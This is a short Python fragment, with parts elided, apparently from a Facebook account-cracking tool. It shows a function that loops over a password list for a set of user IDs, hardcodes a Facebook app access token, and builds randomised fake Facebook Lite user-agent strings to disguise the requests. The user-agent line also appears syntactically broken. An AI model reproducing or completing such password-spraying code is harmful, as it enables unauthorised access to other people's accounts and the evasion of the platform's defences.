...
def api2(ids,names,passlist):
    try:
        ...
        for pw in passlist:
            ...
            fbbv = str(random.randint(000000000,999999999))
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/12.0.0.4627;FBBV/2552427;FBDM/{density=',width=720,height=1280};FBLC/en_US;FBRV/3625212;FBCR/null;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.lite;FBDV/V30;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
